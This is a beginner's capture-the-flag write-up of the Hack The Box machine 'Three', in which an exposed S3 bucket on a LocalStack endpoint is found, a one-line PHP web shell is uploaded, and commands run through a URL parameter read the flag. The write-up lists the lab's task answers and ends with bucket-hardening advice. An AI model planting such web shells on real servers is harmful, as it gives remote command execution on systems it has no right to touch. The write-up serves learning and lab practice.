# Hack The Box: Three Writeup - Very Easy

> **Difficulty:** Very Easy | **Tier:** Starting Point Tier 1 | **Tags:** AWS S3, Subdomain Enumeration, File Upload, Web Shell, Gobuster

Another day, another box! This one was different - I had no idea what Amazon S3 was at the start. Had to Google it, read the AWS documentation, install the CLI, and figure it out from scratch. That's the real learning 😄 Let's dive in 🚀

---

## What is Three?

Three is a Very Easy machine from Hack The Box Starting Point Tier 1. It teaches you about AWS S3 bucket misconfigurations, subdomain enumeration, and how an exposed S3 bucket can lead to remote code execution by uploading a web shell.

**Skills covered:**
- Network reconnaissance with Nmap
- Virtual host subdomain enumeration with Gobuster
- AWS CLI setup and S3 bucket interaction
- File upload to misconfigured S3 bucket
- Web shell execution to read the flag

---

## Setting Up

Connect to the HTB network using your OpenVPN config file:

```bash
sudo openvpn your-htb-vpn-file.ovpn
```

Spawn the Three machine. My target IP was `10.129.110.65`.

<img width="1390" height="99" alt="Target IP" src="https://github.com/user-attachments/assets/a9d8ed43-2f21-4baa-a342-af99988e58df" />

---

## Step 1 - Ping the Target

Confirm the machine is reachable:

```bash
ping -c 4 10.129.110.65
```

<img width="555" height="173" alt="ping check" src="https://github.com/user-attachments/assets/1f1caa93-2f3c-43f0-86e7-913d158daf35" />

All 4 packets returned with 0% packet loss. Target is alive. ✅

---

## Step 2 - Nmap Scan

Run a full service version scan:

```bash
nmap -sVC -T4 10.129.110.65
```
<img width="777" height="299" alt="nmap scan" src="https://github.com/user-attachments/assets/6786659a-9f96-4bbf-8035-1aaee8a74a4a" />


---

## Step 3 - Web Enumeration

Visit `http://10.129.110.65` in the browser. It shows a band website called "The Toppers". Navigate to the **Contact** section.

<img width="1897" height="1029" alt="web page contact" src="https://github.com/user-attachments/assets/b590f120-8b8a-4045-ae44-4948ac372277" />

The email shown is `mail@thetoppers.htb` — so the domain is **`thetoppers.htb`**.

---

## Step 4 - Add Domain to /etc/hosts

Without a DNS server, we use the `/etc/hosts` file to resolve hostnames. Open it with nano:

```bash
sudo nano /etc/hosts
```

Add this line:

```
10.129.110.65   thetoppers.htb
```
<img width="532" height="270" alt="add domain to etc hosts" src="https://github.com/user-attachments/assets/c0f1fd2c-de3d-42d7-967c-600acf7e4e64" />

---

## Step 5 - Subdomain Enumeration with Gobuster

Now use Gobuster in **vhost mode** to find hidden subdomains:

```bash
gobuster vhost --append-domain -u http://thetoppers.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
```

<img width="1352" height="257" alt="gobuster input" src="https://github.com/user-attachments/assets/0ba11363-c7f6-43ef-beaa-2316679283e1" />

<img width="507" height="249" alt="gobuster output" src="https://github.com/user-attachments/assets/5c71ed0f-0b8d-411b-9ec3-b95b7f71ae7f" />

From the output, `s3.thetoppers.htb` returns a **Status: 404** with Size: 21 — different from all the 400 errors. This is our subdomain.

Add it to `/etc/hosts` as well:

```bash
sudo nano /etc/hosts
```

Add:

```
10.129.110.65   s3.thetoppers.htb
```
<img width="563" height="276" alt="add sub domain to hosts" src="https://github.com/user-attachments/assets/875fbb89-d0cf-414f-866c-4edf4d8ce8fb" />

---

## Step 6 - Discover the S3 Service

Visit `http://s3.thetoppers.htb` in the browser:

<img width="707" height="289" alt="sub domain web page" src="https://github.com/user-attachments/assets/0be7701b-e57b-46d3-8acb-2a37a5b316f6" />

```json
{"status": "running"}
```

---

## Step 7 - What is Amazon S3?

At this point I had no idea what S3 was. So I Googled it.

<img width="877" height="285" alt="s3 output" src="https://github.com/user-attachments/assets/8ee06176-019e-431b-909d-b2451ef9409e" />

**Amazon S3 (Simple Storage Service)** is a cloud object storage service by AWS. It stores files in "buckets". The important thing here - if a bucket is **misconfigured**, anyone can list and upload files to it without authentication. This machine is running a **local fake S3 service** using a tool called LocalStack.

The command line utility used to interact with S3 is **`aws`** (the AWS CLI).

---

## Step 8 - Install AWS CLI

I followed the official AWS documentation to install the CLI:

<img width="997" height="158" alt="aws cli installation commands" src="https://github.com/user-attachments/assets/85e90cdc-fed1-420e-ada1-604bd1c3acc7" />

```bash
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install
```

Verify installation:

```bash
aws --version
```

<img width="608" height="44" alt="aws version" src="https://github.com/user-attachments/assets/1563b434-b391-46fa-89dd-240f8aafd622" />

Also checked the help menu to understand available commands:

<img width="629" height="605" alt="aws help menu" src="https://github.com/user-attachments/assets/1f1a9742-223c-4fe8-ad94-67b85b81cefd" />

---

## Step 9 - Configure AWS CLI

The command used to set up the AWS CLI is **`aws configure`** (Task 7).

Since this is a fake local S3, we can use dummy values:

```bash
aws configure
```

<img width="469" height="97" alt="configure aws cli" src="https://github.com/user-attachments/assets/0f8a5e31-f485-46a6-b215-08e207269e8b" />

---

## Step 10 - List S3 Buckets

The command to list all S3 buckets is **`s3 ls`** (Task 8):

```bash
aws s3 ls --endpoint-url http://s3.thetoppers.htb/
```

<img width="619" height="72" alt="aws bucket view" src="https://github.com/user-attachments/assets/80479753-1c92-43f5-beb1-8a05cca56501" />


We can see the bucket `thetoppers.htb` contains the website files — including `index.php`. This means the server runs **PHP**.

---

## Step 11 - Upload a Web Shell

Since we can write to this bucket, we can upload a PHP web shell. Create a file called `shell.php`:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Upload it to the S3 bucket:

```bash
aws s3 cp --endpoint-url http://s3.thetoppers.htb/ shell.php s3://thetoppers.htb/
```
<img width="713" height="36" alt="php file upload" src="https://github.com/user-attachments/assets/79e15d76-c82b-4226-bca9-fb46a6bda4ab" />

---

## Step 12 - Execute the Web Shell

Now visit the shell in the browser:

```
http://thetoppers.htb/shell.php?cmd=ls
```
<img width="767" height="213" alt="shell working" src="https://github.com/user-attachments/assets/4bd405e8-047f-428e-9795-ee8ebcd34c71" />


The shell is working! Now find the flag:

```
http://thetoppers.htb/shell.php?cmd=ls+/var/www
```
<img width="943" height="191" alt="flag found" src="https://github.com/user-attachments/assets/e0b6a5b3-b8f1-4b36-b2a8-6f3d12067c0d" />


Read it:

```
http://thetoppers.htb/shell.php?cmd=cat+/var/www/flag.txt
```

<img width="890" height="165" alt="flag" src="https://github.com/user-attachments/assets/5d09eda6-206c-4905-b884-f8d850e59c21" />


---

## Task Answers

**Task 1 - How many TCP ports are open?**
`2`

**Task 2 - What is the domain of the email address in the Contact section?**
`thetoppers.htb`

**Task 3 - Which Linux file resolves hostnames without a DNS server?**
`/etc/hosts`

**Task 4 - Which subdomain is discovered during enumeration?**
`s3.thetoppers.htb`

**Task 5 - Which service is running on the discovered subdomain?**
`Amazon S3`

**Task 6 - Which command line utility interacts with S3?**
`awscli`

**Task 7 - Which command sets up the AWS CLI?**
`aws configure`

**Task 8 - What command lists all S3 buckets?**
`s3 ls`

**Task 9 - What web scripting language does this server run?**
`PHP`

---

## What I Learned

Three taught me something completely new - I had never heard of Amazon S3 before this box. I had to step back, Google it, read the AWS documentation, install the CLI from scratch, and figure out how it works. That's the real hacking mindset - you won't always know the technology, but you learn it as you go.

The core vulnerability here is a **misconfigured S3 bucket** with public write access. In a real environment this would mean:

- **Make S3 buckets private** - never allow anonymous uploads
- **Don't serve user-uploaded files directly** as executable scripts
- **Use bucket policies** to restrict read/write to trusted identities only
- **Never expose internal storage services** to the public network

---

*Written by [Tharindu Pathmasiri](https://github.com/tharindu-L) - IT Undergraduate | Cybersecurity Enthusiast*
